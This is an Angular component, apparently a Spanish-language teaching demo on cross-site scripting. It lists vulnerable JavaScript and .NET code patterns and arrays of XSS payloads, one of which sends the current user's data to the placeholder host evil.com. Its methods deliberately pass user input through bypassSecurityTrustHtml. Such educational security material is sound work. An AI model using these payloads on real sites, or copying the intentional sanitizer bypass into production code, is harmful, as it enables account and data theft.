import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-vulnerable-demo',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './vulnerable-demo.component.html',
  styleUrl: './vulnerable-demo.component.css'
})
export class VulnerableDemoComponent {
  userInput: string = '';
  dangerousContent: string = '';

  // Ejemplos de código vulnerable
  vulnerableExamples = [
    {
      title: 'innerHTML Directo (MUY PELIGROSO)',
      code: `// ❌ NUNCA hagas esto
element.innerHTML = userInput;`,
      description: 'Insertar directamente contenido HTML del usuario permite ejecución de scripts.'
    },
    {
      title: 'Construcción de URL Insegura',
      code: `// ❌ Vulnerable a XSS
const url = 'redirect.php?url=' + userInput;
window.location.href = url;`,
      description: 'Los parámetros de URL no validados pueden ser manipulados para ataques XSS.'
    },
    {
      title: 'Evaluación Directa de Código',
      code: `// ❌ Extremadamente peligroso
eval(userInput);
new Function(userInput)();`,
      description: 'eval() y Function() ejecutan código JavaScript arbitrario.'
    }
  ];

  // Ejemplos de código vulnerable en .NET/C#
  dotnetVulnerableExamples = [
    {
      title: 'Reflection Directo de Entrada del Usuario',
      code: `// ❌ Controller vulnerable en .NET
[HttpGet]
public IActionResult Search(string query) {
    ViewBag.SearchTerm = query; // Sin encoding
    return View();
}

// En la vista Razor:
<h3>Resultados para: @ViewBag.SearchTerm</h3>`,
      description: 'Mostrar directamente la entrada del usuario sin HTML encoding permite XSS.'
    },
    {
      title: 'API Response Sin Encoding',
      code: `// ❌ Web API vulnerable
[HttpPost]
public IActionResult AddComment([FromBody] CommentDto dto) {
    var comment = new Comment {
        Content = dto.Content, // Sin sanitizar
        Author = dto.Author    // Sin validar
    };

    return Json(new {
        message = $"Comentario de {dto.Author}: {dto.Content}"
    });
}`,
      description: 'Retornar datos del usuario directamente en JSON sin encoding puede causar XSS.'
    },
    {
      title: 'Generación Dinámica de HTML',
      code: `// ❌ Construcción insegura de HTML
public string GenerateUserProfile(User user) {
    return $@"
        <div class='profile'>
            <h2>{user.Name}</h2>
            <p>Bio: {user.Biography}</p>
            <span onclick='showDetails(""{user.Id}"")'>Ver más</span>
        </div>";
}`,
      description: 'Construir HTML concatenando strings permite inyección de código malicioso.'
    },
    {
      title: 'Logging Sin Sanitización',
      code: `// ❌ Logging vulnerable
[HttpPost]
public IActionResult Login(LoginDto dto) {
    try {
        // Lógica de login...
    }
    catch (Exception ex) {
        _logger.LogError($"Error en login para usuario: {dto.Username}");
        return BadRequest($"Error: {ex.Message} - Usuario: {dto.Username}");
    }
}`,
      description: 'Logging y mensajes de error que incluyen entrada del usuario pueden ser explotados.'
    },
    {
      title: 'Configuración de CORS Insegura',
      code: `// ❌ CORS demasiado permisivo
public void ConfigureServices(IServiceCollection services) {
    services.AddCors(options => {
        options.AddPolicy("AllowAll", builder => {
            builder.AllowAnyOrigin()    // ¡Peligroso!
                   .AllowAnyMethod()
                   .AllowAnyHeader();
        });
    });
}`,
      description: 'CORS permisivo permite que sitios maliciosos hagan requests cross-origin.'
    },
    {
      title: 'ViewData/ViewBag Sin Encoding',
      code: `// ❌ Controlador vulnerable
public IActionResult UserDashboard(int userId) {
    var user = _userService.GetUser(userId);
    ViewData["WelcomeMessage"] = $"Bienvenido, {user.Name}!";
    ViewBag.UserBio = user.Biography;
    return View();
}

// En la vista:
@ViewData["WelcomeMessage"]  <!-- Sin Html.Raw pero vulnerable -->
@Html.Raw(ViewBag.UserBio)   <!-- Extremadamente peligroso -->`,
      description: 'ViewData/ViewBag con Html.Raw o en contextos JavaScript permite XSS.'
    }
  ];

  // Ejemplos de configuraciones inseguras en .NET
  dotnetConfigVulnerabilities = [
    {
      title: 'Headers de Seguridad Faltantes',
      code: `// ❌ Startup.cs sin headers de seguridad
public void Configure(IApplicationBuilder app) {
    app.UseRouting();
    app.UseEndpoints(endpoints => {
        endpoints.MapControllers();
    });
    // Faltan: X-Content-Type-Options, X-Frame-Options, CSP
}`,
      description: 'Sin headers de seguridad, la aplicación es vulnerable a varios ataques.'
    },
    {
      title: 'Middleware Sin Validación',
      code: `// ❌ Middleware que no valida entrada
public async Task InvokeAsync(HttpContext context, RequestDelegate next) {
    var userAgent = context.Request.Headers["User-Agent"];
    context.Items["UserInfo"] = $"Navegador: {userAgent}";
    await next(context);
}`,
      description: 'Middleware que procesa headers HTTP sin validación puede ser explotado.'
    }
  ];

  // Ejemplos de payloads XSS comunes
  xssPayloads = [
    '<script>alert("XSS Básico")</script>',
    '<img src="x" onerror="alert(\'XSS con eventos\')">',
    '<svg onload="alert(\'XSS con SVG\')">',
    'javascript:alert("XSS con protocolo")',
    '<iframe src="javascript:alert(\'XSS con iframe\')"></iframe>',
    '<div onclick="alert(\'XSS con eventos\')">Click me</div>'
  ];

  // Payloads específicos para contextos .NET
  dotnetXssPayloads = [
    {
      context: 'Razor View (@ViewBag)',
      payload: '<script>fetch("/admin/users").then(r=>r.text()).then(d=>alert(d))</script>',
      description: 'XSS que roba datos de endpoints administrativos'
    },
    {
      context: 'JSON Response',
      payload: '"; fetch("/api/sensitive").then(r=>alert(r.text())); "',
      description: 'Escape de JSON para ejecutar JavaScript'
    },
    {
      context: 'URL Parameter',
      payload: 'javascript:void(fetch("/api/users/me").then(r=>r.json()).then(d=>location="http://evil.com?data="+JSON.stringify(d)))',
      description: 'XSS que exfiltra datos del usuario actual'
    },
    {
      context: 'HTML Attribute',
      payload: String.raw`" onmouseover="document.cookie=\"admin=true; path=/\"; location.reload()" x="`,
      description: 'Escape de atributo HTML para modificar cookies'
    },
    {
      context: 'CSS Context',
      payload: 'expression(alert("XSS via CSS en IE"))',
      description: 'XSS vía propiedades CSS (IE legacy)'
    },
    {
      context: 'Form Field',
      payload: '<input type="hidden" name="admin" value="true"><script>document.forms[0].submit()</script>',
      description: 'XSS que modifica formularios para escalación de privilegios'
    }
  ];

  constructor(private readonly sanitizer: DomSanitizer) {}

  // Método INSEGURO - Solo para demostración educativa
  demonstrateVulnerability() {
    // ADVERTENCIA: Este método es intencionalmente vulnerable para fines educativos
    this.dangerousContent = this.userInput;
  }

  // Método para usar payload de ejemplo
  useExamplePayload(payload: string) {
    this.userInput = payload;
  }

  // Método para mostrar cómo bypassar la sanitización (EDUCATIVO SOLAMENTE)
  bypassSanitization(): SafeHtml {
    // ADVERTENCIA: Esto es lo que NO se debe hacer en producción
    return this.sanitizer.bypassSecurityTrustHtml(this.userInput);
  }
}
